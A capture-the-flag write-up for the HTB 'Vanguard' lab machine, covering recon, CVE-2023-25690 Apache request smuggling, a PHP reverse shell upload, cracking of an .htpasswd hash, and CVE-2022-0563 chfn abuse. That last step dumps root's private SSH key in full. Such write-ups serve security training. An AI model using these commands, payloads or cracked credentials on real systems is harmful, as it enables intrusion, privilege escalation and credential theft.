# Vanguard (Fullpwn Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Category: Fullpwn
Difficulty: Easy
Points: 1300
N/A

## Strategy
The premise revolving around this challenge 

## Recon
Running an nmap scan on the target, identify a website running and SSH service:
```text
Nmap scan report for vanguard.htb (10.129.251.88)
Host is up (0.018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 8e:bc:b2:f4:1b:e8:62:ac:bd:63:97:80:25:a1:7e:fe (ECDSA)
|_  256 c0:50:00:d3:2e:a4:76:b0:da:52:f3:43:ba:ef:ec:11 (ED25519)
80/tcp   open     http    Apache httpd 2.4.55 ((Unix) PHP/8.2.8)
|_http-title: Vanguard
|_http-server-header: Apache/2.4.55 (Unix) PHP/8.2.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5355/tcp filtered llmnr
```

Connect to the HTB VPN via `sudo openvpn <vpntoken>.ovpn`
Add `vanguard.htb` to your `/etc/hosts` file for local DNS resolution.

Browsing the website of [http://vanguard.htb](http://vanguard.htb)we identify a home page:
![[images/vanguard_1.png]]

Upload Page:
Browsing the website of [http://vanguard.htb/upload.php](http://vanguard.htb/upload.php) we identify a upload form:
![[images/vanguard_2.png]]

About Page:
Browsing the website of [http://vanguard.htb/about.php](http://vanguard.htb/about.php)we identify a about page detailing user information.
![[images/vanguard_3.png]]
Draven Blackthorn,Supreme Chancellor and Chief Strategist
Seraphina Blackwood,Minister of Intelligence and Surveillance
Maximus Stormrider,Minister of Military Defense and Security
Aurora Starfire,Minister of Propaganda and Public Affairs

Directory Fuzzing with gobuster:
```sh
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://vanguard.htb' -t 100
/css                  (Status: 301) [Size: 232] [--> http://vanguard.htb/css/]
/index.php            (Status: 200) [Size: 15698]
/js                   (Status: 301) [Size: 231] [--> http://vanguard.htb/js/]
/server-info          (Status: 200) [Size: 83173]
/uploads              (Status: 401) [Size: 1226]
/.htpasswd            (Status: 403) [Size: 982]
/.htaccess            (Status: 403) [Size: 982]
/.hta                 (Status: 403) [Size: 982]
/~bin                 (Status: 403) [Size: 982]
/~ftp                 (Status: 403) [Size: 982]
/~root                (Status: 403) [Size: 982]
/~nobody              (Status: 403) [Size: 982]
/~mail                (Status: 403) [Size: 982]
/lib                  (Status: 301) [Size: 232] [--> http://vanguard.htb/lib/]
```

Something that wasn't obvious was the accessible `/server-info` endpoint at [http://vanguard.htb/server-info](http://vanguard.htb/server-info) that details the current Apache Server Information including configuration files, server settings, module lists, etc.

```text
Server Settings
Server Version: Apache/2.4.55 (Unix) PHP/8.2.8
Server Built: Jan 18 2023 19:03:59
Server loaded APR Version: 1.7.3
Compiled with APR Version: 1.7.0
Server loaded APU Version: 1.6.3
Compiled with APU Version: 1.6.1
Server loaded PCRE Version: 10.42 2022-12-11
Compiled with PCRE Version: 10.40 2022-04-14
Module Magic Number: 20120211:126
Hostname/port: vanguard.htb:80
Timeouts: connection: 60    keep-alive: 5
MPM Name: prefork
MPM Information: Max Daemons: 250 Threaded: no Forked: yes
Server Architecture: 64-bit
Server Root: /etc/httpd
Config File: /etc/httpd/conf/httpd.conf
...[snip]...
```

When analyzing the server configuration, we find two servers called `backend` and one called `frontend` that are hosted in two different DocumentRoot folders as shown below:
```text
In file: /etc/httpd/conf/httpd.conf
	 549: <VirtualHost 127.0.0.1:8080>
	 551:   ServerName backend
	 552:   DocumentRoot /srv/http/internal
	    : </VirtualHost>
	 556: <VirtualHost *:80>
	 557:   ServerName frontend
	 558:   DocumentRoot /srv/http/vanguard
	 559:   ServerAdmin admin@vanguard.htb
	 576:   <Location /server-info>
	 577:     SetHandler server-info
```

We also find a rewrite condition at the publicly accessible `/leaders/<id>` on the `frontend` rewrites to `/leader.php?id=<id>`  on the `backend` at `localhost:8080` as shown in the configuration below:
```text
In file: /etc/httpd/conf/httpd.conf
	 556: <VirtualHost *:80>
	 561:   RewriteEngine on
	 562:   RewriteRule "^/leaders/(.*)" "http://127.0.0.1:8080/leader.php?id=$1" [P]
	 565:   RewriteCond %{HTTP_HOST} !^vanguard.htb$
	 566:   RewriteRule ^(.*)$ http://vanguard.htb$1 [R=permanent,L]
	    : </VirtualHost>
```

`http://vanguard.htb/leaders/1` => 200, more information on Draven Blackthorn
![[images/vanguard_4.png]]
`http://vanguard.htb/leader.php?id=1` => 404

## CVE-2023-25690 Apache 2.4.55 HTTP Request Smuggling attack
Looking for vulnerabilities to the actual server version of 2.4.55, we identify CVE-2023-25690 and a Proof of Concept article detailing the identification/exploitation: [https://github.com/dhmosfunk/CVE-2023-25690-POC](https://github.com/dhmosfunk/CVE-2023-25690-POC)
Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution. For example, something like: 
```text 
RewriteEngine on 
RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1"; [P] 
ProxyPassReverse /here/ http://example.com:8080/
```
Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning. Users are recommended to update to at least version 2.4.56 of Apache HTTP Server. 

Upload a reverse shell PHP payload called `rev.php` at the `/upload` endpoint such as https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php (replace `PHP PAYLOAD` below with payload), beware it won't allow you to overwrite files.
```text
POST /upload.php HTTP/1.1
Host: vanguard.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------28507332511926759895603037535
Content-Length: 1278
Origin: http://vanguard.htb
Connection: close
Referer: http://vanguard.htb/upload.php
Upgrade-Insecure-Requests: 1

-----------------------------28507332511926759895603037535
Content-Disposition: form-data; name="file"; filename="rev.php"
Content-Type: application/x-php

<PHP PAYLOAD>
-----------------------------28507332511926759895603037535--

```

Send request smuggling request via netcat or burp:
```sh
$ echo "GET /leaders/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/uploads/rev.php HTTP/1.1\r\nHost: vanguard.htb\r\nAccept: */*\r\n\r\n" | nc vanguard.htb 80
```
```text
GET /leaders/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/uploads/rev.php HTTP/1.1
Host: vanguard.htb
Accept: */*


```
URL-Decoded:
```text
GET /leaders/1 HTTP/1.1
Host: localhost

GET /uploads/rev.php HTTP/1.1
User-Agent: nc/0.0.1
Host: 10.129.234.95
Accept: */*


```

A reverse shell can then be obtained:
```sh
$ nc -nlvp 4444         
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.251.192:53406.
bash: cannot set terminal process group (271): Inappropriate ioctl for device
bash: no job control in this shell
[http@vanguard uploads]$ 
```

## Privilege Escalation (http -> maximus)
Access the `/etc/httpd/.htpasswd` file that protects the `/uploads` directory as notated in the Apache server config:
```text
	In file: /etc/httpd/conf/httpd.conf
	 556: <VirtualHost *:80>
	 568:   <Location /uploads*>
	 571:     AuthUserFile /etc/httpd/.htpasswd
	    :   </Location>
	    : </VirtualHost>
```

```sh
[http@vanguard uploads]$ cat /etc/httpd/.htpasswd
maximus-webadmin:$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/
```

Crack using `hashcat`:
```sh
$ echo -n '$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/' | hashid -
Analyzing '$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/'
[+] MD5(APR) [Hashcat Mode: 1600]
[+] Apache MD5 [Hashcat Mode: 1600]
[+] md5apr1 [Hashcat Mode: 1600]

$ hashcat --user -m 1600 --status -a 0 hash.txt /usr/share/wordlists/rockyou.txt
maximus-webadmin:$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/:100%snoopy
```

Login as `maximus` via SSH leveraging password reuse and read the user flag!
```sh
$ sshpass -p '100%snoopy' ssh maximus@vanguard.htb 

[maximus@vanguard ~]$ ls -la
total 24
drwx------ 2 maximus      1002 4096 Jul  5 09:41 .
drwxr-xr-x 3 root    root      4096 Jul  5 06:26 ..
lrwxrwxrwx 1 maximus sysupdate    9 Jul  5 08:08 .bash_history -> /dev/null
-rw-r--r-- 1 maximus maximus     21 May 21 12:56 .bash_logout
-rw-r--r-- 1 maximus maximus     57 May 21 12:56 .bash_profile
-rw-r--r-- 1 maximus maximus    172 May 21 12:56 .bashrc
-rw-r----- 1 root    maximus     44 Jul  7 07:06 user.txt

[maximus@vanguard ~]$ cat user.txt 
HTB{h3y_l0ok_aT_mE_Im_a_bLu3pR1nT_sMUggL3r}
```

User Flag: `HTB{h3y_l0ok_aT_mE_Im_a_bLu3pR1nT_sMUggL3r}`

## CVE-2022-0563 chfn Privileged Read:
A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

```sh
[maximus@vanguard ~]$ pacman -Qi util-linux
Name            : util-linux
Version         : 2.37.3-2
...[snip]..

[maximus@vanguard ~]$ find / -type f -perm -4000 2>/dev/null | grep chfn
/usr/bin/chfn
[maximus@vanguard ~]$ ldd /usr/bin/chfn | grep readline
	libreadline.so.8 => /usr/lib/libreadline.so.8 (0x00007f0f9055c000)
```

I used the following reference to read root's private SSH key, then recreated it on my machine to login. [https://blog.trailofbits.com/2023/02/16/suid-logic-bug-linux-readline/](https://blog.trailofbits.com/2023/02/16/suid-logic-bug-linux-readline/)

Read Private Root SSH Key:
```sh
[maximus@vanguard ~]$ INPUTRC=/root/.ssh/id_rsa chfn
Changing finger information for user.
Password: 100%snoopy
readline: /root/.ssh/id_rsa: line 1: -----BEGIN: unknown key modifier
readline: /root/.ssh/id_rsa: line 2: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: no key sequence terminator
readline: /root/.ssh/id_rsa: line 3: NhAAAAAwEAAQAAAYEAgtSyNnkkyB8bXV1joyjaDUF1DkZtKDTLlSyLwFIqqmdjse6fTaTP: no key sequence terminator
readline: /root/.ssh/id_rsa: line 4: yUm/Gsq5x1vGCjS4bqjMw5J93drKmxTUTRUDjKXpwqtIGmqr+BpEx61fp1whhMIkAb/tgD: no key sequence terminator
readline: /root/.ssh/id_rsa: line 5: tIGBECaLRD1rdVxxBEElaMxY1s0VI/yOQgYxpDA0qyXvEEGMRVUWNi+xuDhkLmVdtHNCRa: no key sequence terminator
readline: /root/.ssh/id_rsa: line 6: 92fmC3wF7IvNct2ii106Vw5XmyQQl16/nKKxav4EyHTykYlj4abuRSJiVUJ1k5kwZ91no3: no key sequence terminator
readline: /root/.ssh/id_rsa: line 7: 1uUZIq6G9B2tQcCggKjpijyI2EnxlHk0NkiyvxFLiQKB4vHZ2/iU+aTLR2EeFg9wq7Cfyf: no key sequence terminator
readline: /root/.ssh/id_rsa: line 8: Ygvdr1SeIT4GGPt4rrmTEiHQet08XCCBl0QwCol4ziYqAH9S0O70khN/T7SoJIKutMaFaU: no key sequence terminator
readline: /root/.ssh/id_rsa: line 9: wAso3F+J3jKQ1h/cOsFGldiGoH9eXURGqb/T1nW6DZ+KJZpa4ZRQ/Q1yeLFgQVyHMx7p2+: no key sequence terminator
readline: /root/.ssh/id_rsa: line 10: Arab9OYMEZXbYnaXgV3VLla85H2yPwbK1bXcuQyjAAAFgLM6YyezOmMnAAAAB3NzaC1yc2: no key sequence terminator
readline: /root/.ssh/id_rsa: line 11: EAAAGBAILUsjZ5JMgfG11dY6Mo2g1BdQ5GbSg0y5Usi8BSKqpnY7Hun02kz8lJvxrKucdb: no key sequence terminator
readline: /root/.ssh/id_rsa: line 12: xgo0uG6ozMOSfd3aypsU1E0VA4yl6cKrSBpqq/gaRMetX6dcIYTCJAG/7YA7SBgRAmi0Q9: no key sequence terminator
readline: /root/.ssh/id_rsa: line 13: a3VccQRBJWjMWNbNFSP8jkIGMaQwNKsl7xBBjEVVFjYvsbg4ZC5lXbRzQkWvdn5gt8BeyL: no key sequence terminator
readline: /root/.ssh/id_rsa: line 14: zXLdootdOlcOV5skEJdev5yisWr+BMh08pGJY+Gm7kUiYlVCdZOZMGfdZ6N9blGSKuhvQd: no key sequence terminator
readline: /root/.ssh/id_rsa: line 15: rUHAoICo6Yo8iNhJ8ZR5NDZIsr8RS4kCgeLx2dv4lPmky0dhHhYPcKuwn8n2IL3a9UniE+: no key sequence terminator
readline: /root/.ssh/id_rsa: line 16: Bhj7eK65kxIh0HrdPFwggZdEMAqJeM4mKgB/UtDu9JITf0+0qCSCrrTGhWlMALKNxfid4y: no key sequence terminator
readline: /root/.ssh/id_rsa: line 17: kNYf3DrBRpXYhqB/Xl1ERqm/09Z1ug2fiiWaWuGUUP0NcnixYEFchzMe6dvgK2m/TmDBGV: no key sequence terminator
readline: /root/.ssh/id_rsa: line 18: 22J2l4Fd1S5WvOR9sj8GytW13LkMowAAAAMBAAEAAAGAEkqVH/M6ppVdc2WQffSYMoI++1: no key sequence terminator
readline: /root/.ssh/id_rsa: line 19: /yovcT/3yFjWiaI847V1p6q0BU91oi0ybEvTqiKuB0E1nw8ZGUR2WaLf8bhNYLSP6+pUON: no key sequence terminator
readline: /root/.ssh/id_rsa: line 20: MSROJsHaxpABb5n8lbMO6wUKZNiPm83E/ck2MtmEWfB26UQbKljmKIh3TSmX3ZiDsKd2M2: no key sequence terminator
readline: /root/.ssh/id_rsa: line 21: U++AzQYNtPBgyIDEgOLAgcTGNI1I480MjmNcwrTS6aKyHoUNjl0VWZfDr4TyNFQCWDmwMU: no key sequence terminator
readline: /root/.ssh/id_rsa: line 22: EYTukf3kvNsHJHnGNnyUNMSnXPJqGukmk0/pLuwVHTwqlSDr+CT+OJY3btFmoQ7UHwtoTB: no key sequence terminator
readline: /root/.ssh/id_rsa: line 23: c3uqzTlUN34cHbJPCBFz4+gb6feoOLzJR8UFo/dallmCjpyCzCMRZet9EOIVu6KIK8HAoe: no key sequence terminator
readline: /root/.ssh/id_rsa: line 24: 2lZcNeiqryXvW0Lcn+GUUOkWgnMOCTRgWVg2OeDotlakE70xi+NF11xhl1OjHFU163OxZc: no key sequence terminator
readline: /root/.ssh/id_rsa: line 25: MLuYR2fJeMX3iXLFi2gaH0xFrtZkrnTWChkVPcJ/iSW2xG6//qgUitg+y3hDFm2AgBAAAA: no key sequence terminator
readline: /root/.ssh/id_rsa: line 26: wQCJsJoKAmW/we/qF/sEotDt4uphXdzAx9vjSAdtjfP8fq++laQHevvqx8uSss9yVLhNNd: no key sequence terminator
readline: /root/.ssh/id_rsa: line 27: NXhVp41MaMD4MSIQX8RIN5KgOlIUM9u5gjKV5auleAqooeqmIqSwIolF5NfGNmUUCgBPvL: no key sequence terminator
readline: /root/.ssh/id_rsa: line 28: farHMq9uDogervebRSj/EXwkhTQ5vg4PrlAhJ4WnfTFxZdvFYis9j9XuziF5URmsxF1h8u: no key sequence terminator
readline: /root/.ssh/id_rsa: line 29: V6jRjubec23Oj/Jmivq2exBkOpQPygYm2353v8u4xlqPbubJAAAADBALftb6nVeY6BVPN2: no key sequence terminator
readline: /root/.ssh/id_rsa: line 30: YvEJum6ZtmccO6dbwVLkQW8Qcyvaj7PhUXjLcluhHt+7dZuS/ac0IU+RK23q7O+nXxZzDE: no key sequence terminator
readline: /root/.ssh/id_rsa: line 31: 04H4TsM5lAT9nbdvRFSHbhrd+qLwb/Rr3VThOIhb88kJnKIoxni3NxkP1SKzZ30DJfg7R+: no key sequence terminator
readline: /root/.ssh/id_rsa: line 32: jUgtMQWoVRRf2G0zEWdQrJoDBx7MV1ujPzoI+OyX26Fuoob/L9NXbbdcNhKVag+BXfYa3a: no key sequence terminator
readline: /root/.ssh/id_rsa: line 33: ZiziKPSe5dH8wn3u1/uS/PQog/7ac/IQAAAMEAthjn1l2NRkDGjwRLIKDX9Yvpk1idEram: no key sequence terminator
readline: /root/.ssh/id_rsa: line 34: wVq5HIBs1VSptTGjWv8vSz9IsBZPKbTHgBtZEUp2RzaeEz1HA0RDnI6MbfaqqmB4+3HegN: no key sequence terminator
readline: /root/.ssh/id_rsa: line 35: dJoI7UGMdtrE52WENK9oEMgLjuLqh5Cp2BpOXvTgcRwVBNNxkhZgGxwm1hfjv663Awgz0G: no key sequence terminator
readline: /root/.ssh/id_rsa: line 36: NDhejAJo6WKLqP97CgX3BYYlxJ2m9ukjsMveduzu3ka22+EeUp0qo4XSp+4EmLQNN6xNF9: no key sequence terminator
readline: /root/.ssh/id_rsa: line 37: Wf5ae3NyhwJadDAAAACXJvb3RAYXJjaAE=: no key sequence terminator
readline: /root/.ssh/id_rsa: line 38: -----END: unknown key modifier
```

Recreate it on my machine:
```sh
$ echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\n$(xsel -bo | awk -F': ' '{print $4}' | sed '1d;$d')\n-----END OPENSSH PRIVATE KEY-----" > root_key
$ cat root_key                                       
-----BEGIN OPENSSH PRIVATE KEY-----
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
Wf5ae3NyhwJadDAAAACXJvb3RAYXJjaAE=
-----END OPENSSH PRIVATE KEY-----
```

Login as root:
```sh
$ ssh -i root_key root@vanguard.htb     
[root@vanguard ~]# cat root.txt 
HTB{R3ad_bEtw3en_tHe_L1n3s}
```

Root Flag: `HTB{R3ad_bEtw3en_tHe_L1n3s}`